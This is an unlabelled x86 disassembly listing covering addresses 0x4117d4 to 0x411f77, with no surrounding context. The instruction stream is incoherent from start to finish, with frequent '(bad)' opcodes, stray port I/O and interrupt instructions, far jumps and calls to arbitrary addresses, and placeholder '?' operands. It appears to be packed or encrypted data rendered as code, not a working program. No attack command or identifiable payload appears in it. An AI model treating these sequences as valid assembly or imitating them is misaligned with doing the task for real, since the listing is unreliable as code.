  4117d4:	inc    ecx
  4117d5:	add    ebx,ebp
  4117d7:	pop    ebp
  4117d8:	jbe    0x41184e
  4117da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117db:	or     esi,esp
  4117dd:	icebp  
  4117de:	stos   DWORD PTR es:[edi],eax
  4117df:	nop
  4117e0:	mov    WORD PTR [ebp-0x31edf905],gs
  4117e6:	add    eax,0xcdd1f3f6
  4117eb:	and    DWORD PTR [edi+0x3e],ebx
  4117ee:	mov    ds:0xe4a350fa,eax
  4117f3:	xchg   ebx,eax
  4117f4:	xchg   edx,eax
  4117f5:	repnz xor dh,BYTE PTR [edi-0xca78e10]
  4117fc:	es add al,0xcf
  4117ff:	popa   
  411800:	inc    eax
  411801:	mov    BYTE PTR [esp+eiz*2-0x4b],dh
  411805:	lods   al,BYTE PTR ds:[esi]
  411806:	and    al,0xbe
  411808:	mov    dh,0x19
  41180a:	sbb    ecx,ebp
  41180c:	rcl    DWORD PTR [ebp+0x2d23ded7],cl
  411812:	inc    ebx
  411813:	aaa    
  411814:	data16 std 
  411816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411817:	push   ecx
  411818:	ret    0x3b95
  41181b:	or     cl,cl
  41181d:	(bad)  
  41181e:	(bad)  
  41181f:	mov    ch,0xd8
  411821:	(bad)  [esi]
  411823:	xchg   ebp,eax
  411824:	jnp    0x4117ca
  411826:	loop   0x41185c
  411828:	mov    dh,0xd8
  41182a:	mov    esi,0xc91befad
  41182f:	or     al,0x24
  411831:	jo     0x4117f1
  411833:	sub    al,0x65
  411835:	jmp    0x94362b73
  41183a:	jbe    0x411815
  41183c:	xor    dh,BYTE PTR es:[edi+0x711daecf]
  411843:	xchg   edi,eax
  411844:	inc    ebx
  411845:	cmp    cl,BYTE PTR [ebx+0x77]
  411848:	jo     0x411876
  41184a:	jl     0x4117ff
  41184c:	test   DWORD PTR [eax-0x13],ecx
  41184f:	and    esp,ebp
  411851:	mov    ebp,0xa1e29bc7
  411856:	adc    bh,BYTE PTR [edx+edi*1+0x20ef7391]
  41185d:	test   DWORD PTR [edi],ecx
  41185f:	and    DWORD PTR [edx-0x7596e5d7],esp
  411865:	push   edx
  411866:	fsub   QWORD PTR [edx+0x6d]
  411869:	imul   esi,esi,0xffffff94
  41186c:	push   0x1c8dec0c
  411871:	int    0x2b
  411873:	enter  0x6565,0x1c
  411877:	stos   DWORD PTR es:[edi],eax
  411878:	repz add ecx,eax
  41187b:	aad    0x97
  41187d:	xor    al,0xff
  41187f:	enter  0x84d1,0x1f
  411883:	loopne 0x411835
  411885:	jns    0x411808
  411887:	pusha  
  411888:	(bad)  
  411889:	xchg   ecx,eax
  41188a:	push   esi
  41188b:	out    0x26,eax
  41188d:	and    BYTE PTR [eax+esi*1-0x18],al
  411891:	fsubr  DWORD PTR [edi-0x2b58b8df]
  411897:	mov    dl,0x52
  411899:	inc    eax
  41189a:	nop
  41189b:	shl    bl,1
  41189d:	js     0x41188d
  41189f:	rcl    BYTE PTR [ebp-0x1f7028],cl
  4118a5:	rcl    DWORD PTR [eax],1
  4118a7:	retf   0xe299
  4118aa:	cmp    eax,0x3e6a1d11
  4118af:	iret   
  4118b0:	push   ds
  4118b1:	mov    DWORD PTR [edi+0x7841ed52],esi
  4118b7:	mov    al,ds:0x39b19a15
  4118bc:	int3   
  4118bd:	pusha  
  4118be:	sub    edi,DWORD PTR [ebx-0x356625d1]
  4118c4:	rcl    DWORD PTR [ebp-0x49],cl
  4118c7:	cs mov ch,0x15
  4118ca:	dec    esi
  4118cb:	pop    ebp
  4118cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118cd:	outs   dx,BYTE PTR ds:[esi]
  4118ce:	ja     0x4118bb
  4118d0:	xor    ah,al
  4118d2:	dec    edi
  4118d3:	dec    eax
  4118d4:	test   al,0x8b
  4118d6:	push   esi
  4118d7:	leave  
  4118d8:	and    BYTE PTR [ebp-0x700f58c9],ch
  4118de:	xor    al,0x2e
  4118e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118e1:	xchg   bl,al
  4118e3:	add    al,0xca
  4118e5:	aaa    
  4118e6:	pop    edi
  4118e7:	dec    esp
  4118e8:	das    
  4118e9:	xchg   edi,eax
  4118ea:	in     al,dx
  4118eb:	mov    ecx,0x91fa8415
  4118f0:	(bad)  
  4118f1:	push   ebp
  4118f2:	fisub  DWORD PTR [edi-0x1f]
  4118f5:	shr    DWORD PTR [ecx+0x78],cl
  4118f8:	sub    ebp,DWORD PTR [esi+0x36ebdcc]
  4118fe:	jp     0x411951
  411900:	test   eax,0x67c38739
  411905:	push   0xfd481ce0
  41190a:	add    DWORD PTR [eax+0x30622a63],esi
  411910:	jo     0x411912
  411912:	cmp    DWORD PTR [esi],0x8a757517
  411918:	pop    esp
  411919:	sub    bl,BYTE PTR [eax-0x3c]
  41191c:	mov    cl,0x17
  41191e:	dec    eax
  41191f:	jne    0x411986
  411921:	mov    ebx,0x5c52e519
  411926:	in     eax,dx
  411927:	(bad)  
  411928:	adc    al,0x4b
  41192a:	sbb    BYTE PTR [esi+0x1a],bl
  41192d:	imul   esi,DWORD PTR [esi-0x4be9cffa],0xf19da239
  411937:	or     BYTE PTR [ecx-0x17],al
  41193a:	mov    es:0x5215d2c7,eax
  411940:	cmp    ebx,edi
  411942:	pop    ebx
  411943:	push   ecx
  411944:	mov    ebx,0xf09617b9
  411949:	sub    esi,DWORD PTR [eax]
  41194b:	not    BYTE PTR ds:0x1e5cee3e
  411951:	push   0xffffff89
  411953:	leave  
  411954:	ins    DWORD PTR es:[edi],dx
  411955:	fwait
  411956:	cwde   
  411957:	cld    
  411958:	mov    ds:0xf1421dc0,eax
  41195d:	and    esi,DWORD PTR ds:0x23435a95
  411963:	out    dx,al
  411964:	jle    0x41197c
  411966:	int3   
  411967:	and    eax,0xe8f4d824
  41196c:	shl    cl,1
  41196e:	(bad)  
  41196f:	(bad)  
  411970:	aaa    
  411971:	pop    eax
  411972:	jle    0x4119c4
  411974:	xchg   esp,eax
  411975:	pop    eax
  411976:	jmp    0xa244:0xc5c8fc0a
  41197d:	push   ebx
  41197e:	std    
  41197f:	or     DWORD PTR [edx],edx
  411981:	cmc    
  411982:	mov    ecx,0x2c10f232
  411987:	cdq    
  411988:	mov    ?,WORD PTR [edx]
  41198a:	pop    ebp
  41198b:	sbb    ecx,DWORD PTR ds:0x988522c5
  411991:	mov    BYTE PTR [esp+ebp*1+0x1b],bh
  411995:	pop    edi
  411996:	shl    BYTE PTR [esi],cl
  411998:	aad    0x53
  41199a:	pop    edx
  41199b:	iret   
  41199c:	or     al,0xce
  41199e:	push   DWORD PTR [eax]
  4119a0:	pop    edx
  4119a1:	mov    al,ds:0xc58fd6ef
  4119a6:	xchg   BYTE PTR [edx-0x6c0d5967],dh
  4119ac:	or     DWORD PTR [ebx+0x7e2f15a6],eax
  4119b2:	imul   edx,DWORD PTR [eax],0x2a3ec50c
  4119b8:	xor    al,0xd2
  4119ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119bb:	iret   
  4119bc:	repz xor dl,BYTE PTR [eax-0x59]
  4119c0:	pop    ecx
  4119c1:	js     0x41197b
  4119c3:	or     al,0x89
  4119c5:	mov    ah,0x34
  4119c7:	mov    ebp,0xc8a587b7
  4119cc:	retf   0x61d3
  4119cf:	out    dx,eax
  4119d0:	push   0xffffffac
  4119d2:	push   edi
  4119d3:	(bad)  
  4119d4:	test   eax,0x585fa70d
  4119d9:	(bad)  
  4119da:	ss inc ebx
  4119dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119dd:	mov    ecx,0xa57a24a5
  4119e2:	ins    DWORD PTR es:[edi],dx
  4119e3:	outs   dx,BYTE PTR ds:[esi]
  4119e4:	dec    ecx
  4119e5:	xchg   DWORD PTR [eax-0x16],esi
  4119e8:	mov    WORD PTR [ebx+0x55],?
  4119eb:	scas   al,BYTE PTR es:[edi]
  4119ec:	nop
  4119ed:	cmp    DWORD PTR [edi+0x77e0a6cc],ebx
  4119f3:	test   cl,0x6f
  4119f6:	js     0x4119f4
  4119f8:	sub    DWORD PTR [esi-0x22],edx
  4119fb:	adc    DWORD PTR [edx],esp
  4119fd:	push   ecx
  4119fe:	xor    ecx,DWORD PTR [esi+eax*1]
  411a01:	popw   es
  411a03:	cmp    eax,0xb0caf62d
  411a08:	pop    ebp
  411a09:	js     0x411a08
  411a0b:	ins    DWORD PTR es:[edi],dx
  411a0c:	and    al,0x54
  411a0e:	es mov edx,0xfcba28cb
  411a14:	sbb    edi,0xba6bb60
  411a1a:	ror    BYTE PTR [edi+0x53],1
  411a1d:	daa    
  411a1e:	in     al,dx
  411a1f:	xchg   ebp,eax
  411a20:	mov    eax,ds:0xba5ec25f
  411a25:	inc    eax
  411a26:	ficom  WORD PTR [esi+0x33db748a]
  411a2c:	adc    BYTE PTR [ecx],ah
  411a2e:	sbb    DWORD PTR [ecx+0x46],eax
  411a31:	dec    ebx
  411a32:	ins    DWORD PTR es:[edi],dx
  411a33:	ss test eax,0x9fdde71b
  411a39:	test   al,0xeb
  411a3b:	popa   
  411a3c:	pop    esi
  411a3d:	stos   DWORD PTR es:[edi],eax
  411a3e:	mov    eax,0x2cf6d09
  411a43:	aas    
  411a44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a45:	or     eax,0x6ac00547
  411a4a:	fistp  DWORD PTR [esi+0x22]
  411a4d:	ret    
  411a4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a4f:	push   0xaf524532
  411a54:	inc    ecx
  411a55:	cmp    edx,DWORD PTR [ebx-0xcdb6f87]
  411a5b:	sub    esp,0x971de58e
  411a61:	mov    edx,DWORD PTR [edx]
  411a63:	xchg   esi,eax
  411a64:	push   0xffffffdc
  411a66:	div    esp
  411a68:	xchg   esp,eax
  411a69:	xor    BYTE PTR [ebp-0x10da8452],ch
  411a6f:	std    
  411a70:	mov    fs,WORD PTR [ebx+edx*8]
  411a73:	idiv   al
  411a75:	call   DWORD PTR [edi]
  411a77:	lea    esi,[esi+0x74]
  411a7a:	fsubp  st(3),st
  411a7c:	sbb    ebp,edx
  411a7e:	mov    bl,al
  411a80:	pop    es
  411a81:	xor    eax,0xd0d202c
  411a86:	rcr    DWORD PTR ds:0x59c21cca,0xa8
  411a8d:	inc    esi
  411a8e:	call   0x1044b736
  411a93:	fild   QWORD PTR es:[esi-0x4a]
  411a97:	add    eax,0xdad49905
  411a9c:	dec    edi
  411a9d:	xor    eax,0xda1482db
  411aa2:	test   eax,0x90b0b6
  411aa7:	outs   dx,DWORD PTR ds:[esi]
  411aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aa9:	push   edi
  411aaa:	mov    eax,ds:0x749f8163
  411aaf:	mov    al,ds:0xffa93eb3
  411ab4:	xchg   esp,eax
  411ab5:	inc    eax
  411ab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ab7:	sub    al,0x4
  411ab9:	inc    edi
  411aba:	or     DWORD PTR [edi+ebp*4],eax
  411abd:	mov    bh,dh
  411abf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ac0:	cld    
  411ac1:	in     eax,dx
  411ac2:	(bad)  
  411ac3:	push   ebx
  411ac4:	repnz outs dx,DWORD PTR ds:[esi]
  411ac6:	gs mov al,0xb2
  411ac9:	loope  0x411b17
  411acb:	js     0x411afd
  411acd:	fs (bad) 
  411acf:	(bad)  
  411ad0:	fst    DWORD PTR [esi]
  411ad2:	push   ecx
  411ad3:	sbb    BYTE PTR [edx+edi*8+0x580311c7],0x6e
  411adb:	mov    edi,0x5ac01c55
  411ae0:	pop    edx
  411ae1:	(bad)  
  411ae2:	push   DWORD PTR [edi]
  411ae4:	into   
  411ae5:	mov    bh,0xb5
  411ae7:	add    al,0x85
  411ae9:	xor    al,0xa
  411aeb:	sub    eax,DWORD PTR ds:0x394a8dff
  411af1:	imul   edi,DWORD PTR [ebp-0x3aba1e51],0xffffffcc
  411af8:	(bad)  
  411af9:	fs popa 
  411afb:	jl     0x411b6e
  411afd:	push   eax
  411afe:	scas   eax,DWORD PTR es:[edi]
  411aff:	mov    cl,0x8e
  411b01:	and    ah,0xa2
  411b04:	(bad)  
  411b06:	mov    ebx,0x8963c466
  411b0b:	push   cs
  411b0c:	es ret 0xb038
  411b10:	fisubr WORD PTR [esi+0x73]
  411b13:	and    DWORD PTR ds:0xede50bce,esp
  411b19:	in     al,0xba
  411b1b:	stos   DWORD PTR es:[edi],eax
  411b1c:	jmp    0x411b0b
  411b1e:	push   esi
  411b1f:	arpl   WORD PTR [edi-0x3082a844],di
  411b25:	adc    edi,ecx
  411b27:	in     eax,0xad
  411b29:	dec    ebx
  411b2a:	mov    al,0xe6
  411b2c:	xchg   edx,eax
  411b2d:	dec    esp
  411b2e:	or     DWORD PTR [ecx-0x22cd1731],0xfffffff1
  411b35:	out    0xaf,al
  411b37:	mov    edi,0xb59044ab
  411b3c:	push   ebx
  411b3d:	inc    ecx
  411b3e:	mov    dh,0x38
  411b40:	jne    0x411b82
  411b42:	popa   
  411b43:	clc    
  411b44:	rcr    DWORD PTR [edi+esi*2+0x699703d9],0xcb
  411b4c:	(bad)  
  411b4d:	adc    al,bl
  411b4f:	call   0xcdc76a84
  411b54:	sar    BYTE PTR [esi+0x6],1
  411b57:	out    dx,al
  411b58:	call   0xf527:0xf1973adf
  411b5f:	xchg   esp,eax
  411b60:	or     al,0x2e
  411b62:	nop
  411b63:	and    eax,0xe6112090
  411b68:	jbe    0x411b8a
  411b6a:	idiv   DWORD PTR ds:0x4bba7e2e
  411b70:	ret    
  411b71:	outs   dx,DWORD PTR ds:[esi]
  411b72:	fdivr  QWORD PTR [edi]
  411b74:	sbb    BYTE PTR [esp+eiz*2-0x55557d6d],bh
  411b7b:	lods   al,BYTE PTR ds:[esi]
  411b7c:	jb     0x411b9a
  411b7e:	adc    ch,BYTE PTR ds:0x974bb4c1
  411b84:	test   eax,0x130e0d41
  411b89:	aam    0xc2
  411b8b:	sbb    BYTE PTR [edx+0x18],ah
  411b8e:	xchg   ebx,eax
  411b8f:	mov    ds:0xfcd0270d,eax
  411b94:	sbb    al,0x60
  411b96:	fild   QWORD PTR [eax-0x11]
  411b99:	lock xchg esp,eax
  411b9b:	out    0x4f,eax
  411b9d:	cdq    
  411b9e:	push   ds
  411b9f:	and    edi,DWORD PTR [edi+0x77]
  411ba2:	clc    
  411ba3:	dec    edx
  411ba4:	out    dx,al
  411ba5:	inc    edi
  411ba6:	mov    eax,ds:0xb2023219
  411bab:	lahf   
  411bac:	xor    eax,DWORD PTR [esi]
  411bae:	daa    
  411baf:	adc    al,BYTE PTR [esi-0x35a714d3]
  411bb5:	shr    DWORD PTR [edi+0x462f9c6b],1
  411bbb:	stos   DWORD PTR es:[edi],eax
  411bbc:	repz mov ecx,0xf2e20ef
  411bc2:	gs iret 
  411bc4:	lds    edx,FWORD PTR [ebx-0x1abbb6cb]
  411bca:	inc    edx
  411bcb:	mov    eax,ds:0xf27ff952
  411bd0:	pop    eax
  411bd1:	cdq    
  411bd2:	inc    esi
  411bd3:	mov    cs,WORD PTR es:[ebx-0x1e]
  411bd7:	bound  ebp,QWORD PTR [edi+0x4d]
  411bda:	xchg   ebx,eax
  411bdb:	pop    ds
  411bdc:	fild   QWORD PTR [ebp-0x1f]
  411bdf:	lahf   
  411be0:	push   esi
  411be1:	stos   DWORD PTR es:[edi],eax
  411be2:	pop    ebp
  411be3:	sub    al,ch
  411be5:	out    0x8d,eax
  411be7:	dec    esi
  411be8:	mov    al,ds:0xf26cbbe3
  411bed:	mov    edx,0xcc57d85
  411bf2:	xlat   BYTE PTR ds:[ebx]
  411bf3:	dec    ebx
  411bf4:	out    0x5e,al
  411bf6:	fs aad 0x62
  411bf9:	xor    BYTE PTR ds:0x322e1b,dl
  411bff:	int3   
  411c00:	outs   dx,DWORD PTR ds:[esi]
  411c01:	adc    cl,BYTE PTR [esp+ebp*8]
  411c04:	scas   eax,DWORD PTR es:[edi]
  411c05:	aam    0x17
  411c07:	cld    
  411c08:	sub    DWORD PTR [ebx-0x66],edx
  411c0b:	loopne 0x411bfe
  411c0d:	fs and eax,0x7206c710
  411c13:	xchg   ebp,eax
  411c14:	mov    eax,0x2d6283b
  411c19:	retf   
  411c1a:	(bad)  
  411c1b:	fistp  WORD PTR [esi]
  411c1d:	xchg   edi,eax
  411c1e:	adc    esp,esp
  411c20:	cmp    edi,esp
  411c22:	push   esp
  411c23:	dec    ecx
  411c24:	dec    edi
  411c25:	jb     0x411c64
  411c27:	dec    edx
  411c28:	sub    ch,ah
  411c2a:	pop    ebp
  411c2b:	rcl    ebp,1
  411c2d:	add    ebp,0x5d
  411c30:	jge    0x411bb2
  411c32:	mov    ecx,?
  411c34:	lea    esi,[ebp+0x2d]
  411c37:	adc    DWORD PTR [edi],edi
  411c39:	dec    esp
  411c3a:	je     0x411c7a
  411c3c:	sti    
  411c3d:	push   esi
  411c3e:	nop
  411c3f:	cmc    
  411c40:	cmp    DWORD PTR ds:0xcb3af19e,edx
  411c46:	jg     0x411bf8
  411c48:	scas   al,BYTE PTR es:[edi]
  411c49:	and    BYTE PTR [esi-0x2bf2040c],dh
  411c4f:	retf   
  411c50:	mov    ds,WORD PTR [edi-0x18]
  411c53:	shr    DWORD PTR [edi+eax*2-0x46],cl
  411c57:	dec    edi
  411c58:	cmp    DWORD PTR [esp+ebx*8],edx
  411c5b:	ror    DWORD PTR [ebx-0x37],1
  411c5e:	adc    edx,DWORD PTR [eax+ebp*8]
  411c61:	push   eax
  411c62:	mov    ecx,0x5dfda7e9
  411c67:	sub    esi,DWORD PTR [ebx+0x213cbc2f]
  411c6d:	stc    
  411c6e:	iret   
  411c6f:	les    esp,FWORD PTR [edx]
  411c71:	inc    ecx
  411c72:	shl    DWORD PTR ds:0xde8f83ff,cl
  411c78:	mov    dl,0xf4
  411c7a:	xor    eax,0x798cbf23
  411c7f:	push   edx
  411c80:	lahf   
  411c81:	mov    BYTE PTR [ebx],bh
  411c83:	mov    ds:0x3f9db7dd,eax
  411c88:	mov    bl,0xc
  411c8a:	dec    ebp
  411c8b:	mov    BYTE PTR [eax],ch
  411c8d:	and    BYTE PTR [esi+0x4ded8abe],dl
  411c93:	sub    al,0xb6
  411c95:	add    al,0xb7
  411c97:	sub    eax,0xe1b625d2
  411c9c:	out    dx,eax
  411c9d:	or     esi,eax
  411c9f:	(bad)  
  411ca0:	punpckhwd mm6,mm5
  411ca3:	lock add bh,ah
  411ca6:	inc    eax
  411ca7:	jecxz  0x411cd1
  411ca9:	push   ebp
  411caa:	mov    ecx,DWORD PTR [ecx-0x7d]
  411cad:	and    dl,bh
  411caf:	inc    eax
  411cb0:	js     0x411c4a
  411cb2:	xchg   edi,eax
  411cb3:	mov    ecx,0xde67ff86
  411cb8:	or     DWORD PTR [esi+0x44d27e9a],esi
  411cbe:	mov    ah,0x1d
  411cc0:	test   eax,0x15e9245b
  411cc5:	(bad)  
  411cc6:	lea    esp,[ebx+eax*2+0x70]
  411cca:	int3   
  411ccb:	scas   eax,DWORD PTR es:[edi]
  411ccc:	call   0x9d:0x2ec4b81b
  411cd3:	cwde   
  411cd4:	inc    edi
  411cd5:	sbb    BYTE PTR [esi],dh
  411cd7:	push   0xffffff98
  411cd9:	pop    ds
  411cda:	cli    
  411cdb:	jmp    0xf577:0xa294c4bf
  411ce2:	xchg   edx,eax
  411ce3:	mov    al,ds:0x5dc2ebe8
  411ce8:	jl     0x411d06
  411cea:	cli    
  411ceb:	sub    dl,bh
  411ced:	stos   DWORD PTR es:[edi],eax
  411cee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cef:	mov    WORD PTR [edx+edi*2+0x75aef494],ss
  411cf6:	aad    0xbd
  411cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cf9:	jmp    0x2304d89
  411cfe:	cmp    dh,0xcb
  411d01:	scas   al,BYTE PTR es:[edi]
  411d02:	or     ebx,DWORD PTR [eax]
  411d04:	push   ecx
  411d05:	adc    BYTE PTR [edx],ch
  411d07:	aaa    
  411d08:	test   DWORD PTR [ebx+0x79],ebx
  411d0b:	push   edi
  411d0c:	icebp  
  411d0d:	mov    ch,0xa
  411d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d10:	das    
  411d11:	mov    esp,0xbebbdca1
  411d16:	mov    al,ds:0x98355b0
  411d1b:	pop    ss
  411d1c:	adc    BYTE PTR [ecx+0x224a6cba],bh
  411d22:	dec    edx
  411d23:	inc    edx
  411d24:	dec    esi
  411d25:	mov    bl,0x42
  411d27:	and    dl,BYTE PTR [ebx]
  411d29:	jl     0x411d05
  411d2b:	es ja  0x411d62
  411d2e:	sbb    al,0xa1
  411d30:	mov    edx,0xb9bb5797
  411d35:	jmp    0x660:0x9ec94226
  411d3c:	sar    dl,cl
  411d3e:	out    0x24,eax
  411d40:	mov    al,0x12
  411d42:	jmp    0x9e458aa2
  411d47:	sbb    ch,BYTE PTR fs:[ebp-0x206fe868]
  411d4e:	push   ss
  411d4f:	hlt    
  411d50:	les    esp,FWORD PTR [eax+0x23]
  411d53:	loope  0x411d52
  411d55:	mov    eax,ds:0xc8747f32
  411d5a:	xchg   ebx,eax
  411d5b:	cmc    
  411d5c:	or     BYTE PTR [ebp+0x19],ch
  411d5f:	(bad)  
  411d60:	adc    BYTE PTR [ecx+0x3c44e10f],bl
  411d66:	inc    edi
  411d67:	or     al,0x30
  411d69:	sbb    eax,0x913b0fbd
  411d6e:	ret    0x3c47
  411d71:	dec    ebx
  411d72:	mov    edi,0x29065fa2
  411d77:	or     al,BYTE PTR ds:0x90db3624
  411d7d:	aad    0x7b
  411d7f:	sub    al,0xbc
  411d81:	sub    DWORD PTR [edx-0x63],esp
  411d84:	xor    dl,bh
  411d86:	dec    ebx
  411d87:	cli    
  411d88:	rcl    DWORD PTR [ecx],cl
  411d8a:	mov    ebx,0x2ea1c395
  411d8f:	jmp    0x83a63b9d
  411d94:	inc    ecx
  411d95:	push   ebx
  411d96:	pop    edx
  411d97:	lea    ecx,[ecx+0x4d8beb7d]
  411d9d:	inc    edx
  411d9e:	jmp    DWORD PTR [ebx-0x3d094b49]
  411da4:	jbe    0x411dda
  411da6:	out    0x8c,al
  411da8:	and    BYTE PTR [ecx],0x8a
  411dab:	pop    edi
  411dac:	call   0xeea710c8
  411db1:	sbb    bh,BYTE PTR [eax]
  411db3:	push   cs
  411db4:	loope  0x411d8c
  411db6:	cld    
  411db7:	jb     0x411d9c
  411db9:	xor    DWORD PTR [esi+0x73],edx
  411dbc:	dec    ebx
  411dbd:	sbb    al,0x34
  411dbf:	lock jno 0x411d7a
  411dc2:	dec    ebx
  411dc3:	push   0xffffff97
  411dc5:	int    0xec
  411dc7:	pop    ss
  411dc8:	sub    al,0x59
  411dca:	jle    0x411e1e
  411dcc:	int3   
  411dcd:	shl    DWORD PTR [edi+0x53],0x0
  411dd1:	xor    BYTE PTR ds:0xe0f1ee1c,bl
  411dd7:	jbe    0x411d79
  411dd9:	xchg   ecx,eax
  411dda:	xchg   ebp,eax
  411ddb:	loop   0x411e5c
  411ddd:	iret   
  411dde:	dec    ebp
  411ddf:	sub    esi,ecx
  411de1:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  411de3:	les    edi,FWORD PTR ds:0x1a1bc6d3
  411de9:	pop    esi
  411dea:	jmp    0x1da:0xce1fea28
  411df1:	cmp    DWORD PTR [esi+eiz*1],ebx
  411df4:	adc    eax,DWORD PTR [edx+ecx*2+0xa]
  411df8:	push   ss
  411df9:	mov    ebp,ebp
  411dfb:	std    
  411dfc:	cmc    
  411dfd:	pop    ebx
  411dfe:	xor    esp,DWORD PTR [ebx-0x7374d544]
  411e04:	dec    esp
  411e05:	pop    esi
  411e06:	add    al,0xda
  411e08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e09:	push   0xf194b7ae
  411e0e:	ds mov bl,0xa8
  411e11:	nop
  411e12:	pop    ecx
  411e13:	dec    ecx
  411e14:	sub    edi,DWORD PTR [edi-0xc]
  411e17:	arpl   WORD PTR [edx],si
  411e19:	not    esi
  411e1b:	test   DWORD PTR [ebx],0xac1fd030
  411e21:	shl    BYTE PTR [esi-0xd],cl
  411e24:	pop    ds
  411e25:	push   0x73
  411e27:	iret   
  411e28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e2a:	ss sti 
  411e2c:	daa    
  411e2d:	and    BYTE PTR [esi-0x4c],al
  411e30:	lock cmp eax,0x2f176528
  411e36:	enterw 0xa98c,0x16
  411e3b:	out    0x94,eax
  411e3d:	inc    eax
  411e3e:	sub    eax,0x89de08e1
  411e43:	stos   DWORD PTR es:[edi],eax
  411e44:	xor    al,BYTE PTR [esi-0x41507ac1]
  411e4a:	pop    eax
  411e4b:	mov    dh,0x29
  411e4d:	pusha  
  411e4e:	lahf   
  411e4f:	xchg   DWORD PTR [esi],edx
  411e51:	cdq    
  411e52:	out    dx,eax
  411e53:	repnz xor BYTE PTR [esi],0xd1
  411e57:	into   
  411e58:	add    BYTE PTR [ecx-0x2],0x6b
  411e5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e5d:	ins    DWORD PTR es:[edi],dx
  411e5e:	sar    al,1
  411e60:	test   al,0x1d
  411e62:	fsub   st(0),st
  411e64:	lods   eax,DWORD PTR ds:[esi]
  411e65:	mov    ecx,DWORD PTR [esi+0x2f757b0d]
  411e6b:	add    ebx,DWORD PTR [ecx+eiz*8]
  411e6e:	jle    0x411eb7
  411e70:	mov    ds:0xb6222fb7,al
  411e75:	jae    0x411e7e
  411e77:	aad    0xab
  411e79:	and    al,0x2a
  411e7b:	mov    bl,0x5
  411e7d:	push   esi
  411e7e:	or     eax,DWORD PTR [edi+0x1]
  411e81:	pop    ecx
  411e82:	xor    eax,0x247f46c
  411e87:	repz out 0xbe,eax
  411e8a:	xor    BYTE PTR [ecx],al
  411e8c:	dec    eax
  411e8d:	(bad)  
  411e8e:	cmp    dl,al
  411e90:	ss out 0xff,al
  411e93:	cmp    al,0x65
  411e95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e96:	fnsave [eax+0x4c]
  411e99:	js     0x411f08
  411e9b:	cdq    
  411e9c:	fidiv  WORD PTR [ebp-0x1f25c623]
  411ea2:	sbb    edx,DWORD PTR [eax-0xa0f84e1]
  411ea8:	jb     0x411eb1
  411eaa:	aas    
  411eab:	sub    bh,BYTE PTR [ebp-0x15]
  411eae:	in     al,0x1a
  411eb0:	ret    0xed40
  411eb3:	or     DWORD PTR [ebx+ebx*4+0x80f50c4],eax
  411eba:	lock or DWORD PTR [edx-0x2ef8251a],edi
  411ec1:	(bad)  
  411ec2:	add    bh,cl
  411ec4:	scas   eax,DWORD PTR es:[edi]
  411ec5:	mov    BYTE PTR [ebx-0x3],ah
  411ec8:	or     dl,BYTE PTR [ebx-0x19]
  411ecb:	cmc    
  411ecc:	mov    DWORD PTR [edi-0x7b],ecx
  411ecf:	outs   dx,BYTE PTR ds:[esi]
  411ed0:	stos   BYTE PTR es:[edi],al
  411ed1:	push   eax
  411ed2:	mov    cl,0xb4
  411ed4:	sbb    cl,bl
  411ed6:	push   esi
  411ed7:	inc    ebp
  411ed8:	mov    eax,ds:0x7ff5cbb6
  411edd:	mov    ds:0x84526889,eax
  411ee2:	push   es
  411ee3:	cmp    esi,DWORD PTR [ecx+0x11e851da]
  411ee9:	pop    es
  411eea:	repz scas eax,DWORD PTR es:[edi]
  411eec:	paddw  mm2,QWORD PTR [edi]
  411eef:	ds mov esp,0xac6f489b
  411ef5:	mov    dh,0x7f
  411ef7:	sbb    al,0xb3
  411ef9:	mov    ss:0xe406a29a,eax
  411eff:	les    ebp,FWORD PTR [esi-0x67]
  411f02:	(bad)  
  411f03:	and    DWORD PTR [ebx-0x57],edx
  411f06:	sti    
  411f07:	(bad)  
  411f08:	popa   
  411f09:	out    dx,eax
  411f0a:	lods   al,BYTE PTR ds:[esi]
  411f0b:	pop    es
  411f0c:	ror    BYTE PTR [esi+0xc],0xc8
  411f10:	shl    DWORD PTR [eax+0x0],1
  411f13:	adc    al,0xa5
  411f15:	out    dx,al
  411f16:	outs   dx,BYTE PTR ds:[esi]
  411f17:	lods   al,BYTE PTR ds:[esi]
  411f18:	jge    0x411f72
  411f1a:	mov    ds:0x5349c9d1,eax
  411f1f:	stc    
  411f20:	add    DWORD PTR [eax+eax*4+0x605c549e],0x9423083e
  411f2b:	push   ss
  411f2c:	mov    ebp,0x38b0ca92
  411f31:	pop    ds
  411f32:	sub    al,0x4f
  411f34:	mov    ah,0x94
  411f36:	inc    eax
  411f37:	mov    ds:0x629102aa,eax
  411f3c:	scas   eax,DWORD PTR es:[edi]
  411f3d:	imul   edi,DWORD PTR [ebp-0x284c49ad],0x5435fd0f
  411f47:	call   0x5e918707
  411f4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f4d:	mov    DWORD PTR [edx+0x21aa9771],esi
  411f53:	into   
  411f54:	mov    ebx,0x682ec1b
  411f59:	push   ds
  411f5a:	cmp    cl,BYTE PTR [ecx+0x6fad2f36]
  411f60:	add    ch,cl
  411f62:	rcl    DWORD PTR [eax+ebp*4],0x50
  411f66:	aaa    
  411f67:	jl     0x411fe3
  411f69:	push   edx
  411f6a:	pop    ebx
  411f6b:	ror    bh,cl
  411f6d:	and    BYTE PTR [eax+0x18fc1306],dl
  411f73:	loop   0x411f34
  411f75:	jno    0x411fae
  411f77:	sbb    edx,esi
